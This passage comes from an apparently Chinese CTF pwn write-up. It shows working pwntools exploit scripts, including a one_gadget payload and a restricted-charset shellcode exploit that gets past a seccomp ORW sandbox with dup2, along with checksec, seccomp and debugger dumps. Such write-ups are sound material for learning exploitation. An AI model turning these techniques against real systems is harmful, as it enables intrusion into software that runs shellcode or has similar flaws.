ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* 0x401125\n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x92E)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload =  p64(<span class="number">2</span>) </span><br><span class="line">payload += p64(<span class="number">7</span>)+p64(<span class="number">0x3c4b78</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">6</span>)+p64(one_gadgets[<span class="number">3</span>])</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">7</span>)+p64(one_gadgets[<span class="number">3</span>])</span><br><span class="line">payload += p64(<span class="number">6</span>)+p64(<span class="number">0x5f0f48</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;code:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">41</span>d67b4f1d7bba2b90bd3fcf2cbf5119a31a6dcb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，PIE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cxt = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(cxt, <span class="number">0x7FFF0000</span>LL, SYS_open, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(cxt, <span class="number">0x7FFF0000</span>LL, SYS_read, <span class="number">1LL</span>);</span><br><span class="line">seccomp_rule_add(cxt, <span class="number">0x7FFF0000</span>LL, SYS_write, <span class="number">1LL</span>);</span><br><span class="line">seccomp_rule_add(cxt, <span class="number">0x7FFF0000</span>LL, SYS_dup2, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">return</span> seccomp_load(cxt);</span><br></pre></td></tr></table></figure>
<ul>
<li>只能打 ORW（需要先进行 patch 才能用 seccomp-tools 查看）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x12</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0f</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x00000021</span>  <span class="keyword">if</span> (A == dup2) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x25</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x25</span> <span class="number">0x07</span> <span class="number">0x06</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0020</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x25</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &lt;= <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>程序可以执行 shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">box();</span><br><span class="line">(*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))code)();</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序对 shellcode 的限制特别严格：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( buf = code; buf; ++buf )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (buf - code) &gt;&gt; <span class="number">4</span> &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>输入字节数为16</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *buf &gt;= <span class="number">0x4F</span> &amp;&amp; *buf &lt;= <span class="number">0x5F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++index;</span><br><span class="line">    ++buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !((buf - code) &gt;&gt; <span class="number">4</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] It&#x27;s Not GW&#x27;s Expect !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>限制 shellcode 的每个字符都要在 <code>[0x4F,0x5F]</code> 的范围内</li>
</ul>
<p>首先必须绕过对字符的限制，因为就连 “flag” 字符串也会被隔离，接着要解决 shellcode 长度的问题，在面对带有限制的 shellcode 时有两种处理方法：</p>
<ul>
<li>构造 sys_read </li>
<li>通过 <code>add rsp offset; ret;</code> 来将栈迁移到不被限制的区域</li>
<li>通过汇编指令来修改 shellcode 本身（shellcode 自修改）</li>
</ul>
<p>由于 syscall 0f05 被限制并且 shellcode 本身也较短，上述两种方法好像都不适用，但程序有一个地方可以写入 syscall：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[2] Input: (ye / no)&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">2uLL</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;ye&quot;</span>) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;xxxx&#123;xxxx_xxxx_xxxx_xxxx&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  pwn(buf);</span><br></pre></td></tr></table></figure>
<p>执行 shellcode 时的寄存器信息和栈信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x7ffe033d0c50</span> ◂— <span class="number">0x59595a515e505f53</span> (<span class="string">&#x27;S_P^QZYY&#x27;</span>) <span class="comment">/* sys_read para2 */</span></span><br><span class="line"> RBX  <span class="number">0x0</span> <span class="comment">/* sys_read para1 */</span></span><br><span class="line"> RCX  <span class="number">0x55cd7e1ede7f</span></span><br><span class="line"> RDX  <span class="number">0x55c8229cf7b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x7</span></span><br><span class="line"> RSI  <span class="number">0x55c8229ce010</span> ◂— <span class="number">0x7</span></span><br><span class="line"> R8   <span class="number">0x55c8229cf6b0</span> ◂— <span class="number">0x55cd7e1ede7f</span></span><br><span class="line"> R9   <span class="number">0x55c8229cf6b0</span> ◂— <span class="number">0x55cd7e1ede7f</span></span><br><span class="line"> R10  <span class="number">0x1</span></span><br><span class="line"> R11  <span class="number">0x20218404d1c748ff</span></span><br><span class="line"> R12  <span class="number">0x7ffe033d0dc8</span> —▸ <span class="number">0x7ffe033d23cd</span> ◂— <span class="string">&#x27;./shellcode1&#x27;</span></span><br><span class="line"> R13  <span class="number">0x55c821dff574</span> ◂— endbr64 </span><br><span class="line"> R14  <span class="number">0x55c821e01d60</span> —▸ <span class="number">0x55c821dff240</span> ◂— endbr64 </span><br><span class="line"> R15  <span class="number">0x7f4e14593040</span> (_rtld_global) —▸ <span class="number">0x7f4e145942e0</span> —▸ <span class="number">0x55c821dfe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"> RBP  <span class="number">0x7ffe033d0c70</span> —▸ <span class="number">0x7ffe033d0cb0</span> ◂— <span class="number">0x1</span></span><br><span class="line">*RSP  <span class="number">0x7ffe033d0c18</span> —▸ <span class="number">0x55c821dff4f4</span> ◂— nop    </span><br><span class="line">*RIP  <span class="number">0x7ffe033d0c50</span> ◂— <span class="number">0x59595a515e505f53</span> (<span class="string">&#x27;S_P^QZYY&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7ffe033d0c18</span> —▸ <span class="number">0x55c821dff4f4</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7ffe033d0c20</span> ◂— <span class="number">0x14</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7ffe033d0c28</span> —▸ <span class="number">0x7ffe033d0c80</span> ◂— <span class="number">0x6f6e</span> <span class="comment">/* &#x27;no&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7ffe033d0c30</span> ◂— <span class="number">0x1021e000e9</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7ffe033d0c38</span> —▸ <span class="number">0x7ffe033d0c60</span> —▸ <span class="number">0x7ffe033d0d0a</span> ◂— <span class="number">0xc34400007f4e1459</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7ffe033d0c40</span> —▸ <span class="number">0x7ffe033d0c60</span> —▸ <span class="number">0x7ffe033d0d0a</span> ◂— <span class="number">0xc34400007f4e1459</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7ffe033d0c48</span> —▸ <span class="number">0x7ffe033d0c50</span> ◂— <span class="number">0x59595a515e505f53</span> (<span class="string">&#x27;S_P^QZYY&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│ rax rip <span class="number">0x7ffe033d0c50</span> ◂— <span class="number">0x59595a515e505f53</span> (<span class="string">&#x27;S_P^QZYY&#x27;</span>)</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7ffe033d0c58</span> ◂— <span class="number">0x5a55555555555d5c</span> (<span class="string">&#x27;\\]UUUUUZ&#x27;</span>)</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7ffe033d0c60</span> —▸ <span class="number">0x7ffe033d0d0a</span> ◂— <span class="number">0xc34400007f4e1459</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│     <span class="number">0x7ffe033d0c68</span> ◂— <span class="number">0x12dacfe397d04000</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│ rbp <span class="number">0x7ffe033d0c70</span> —▸ <span class="number">0x7ffe033d0cb0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0x7ffe033d0c78</span> —▸ <span class="number">0x55c821dff613</span> ◂— lea    rax, [rip + <span class="number">0xb01</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>pop rsp</code> 使 <code>0x7ffe033d0c80</code> 成为 <code>rsp</code> 时，寄存器信息如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x7fff656bc980</span> ◂— <span class="number">0x50f</span></span><br><span class="line">*RIP  <span class="number">0x7fff656bc957</span> ◂— <span class="number">0x5f5555555555585d</span> (<span class="string">&#x27;]XUUUUU_&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>寄存器 <code>rsp rip</code> 距离很近，只需要进行适当数量的 <code>push</code> 和 <code>pop</code> 就控制 <code>rip</code>（具体数量可以边调试边调整）</li>
</ul>
<p>最后需要使用 <code>shellcraft.dup2(a,b)</code> 对文件描述符进行迁移才能绕过 sandbox</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./shellcode1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x14F2)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Your chocie:&quot;</span>,<span class="built_in">bytes</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sa(<span class="string">&quot;[2] Input: (ye / no)&quot;</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    pop rsp</span></span><br><span class="line"><span class="string">    pop rbp</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rbp</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>).ljust(<span class="number">16</span>,p8(<span class="number">0x5a</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;[5] ======== Input Your P0P Code ========&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">gadget = <span class="string">&quot;sub rsp,0x18;&quot;</span></span><br><span class="line">shellcode_open = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode_dup1 = shellcraft.dup2(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">shellcode_read = shellcraft.read(<span class="string">&quot;rax&quot;</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode_dup2 = shellcraft.dup2(<span class="number">1</span>,<span class="number">0x100000000</span>)</span><br><span class="line">shellcode_write = shellcraft.write(<span class="number">0x100000000</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode=asm(gadget+shellcode_open+shellcode_dup1+shellcode_read+shellcode_dup2+shellcode_write,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0x10</span>-<span class="number">3</span>)+shellcode</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
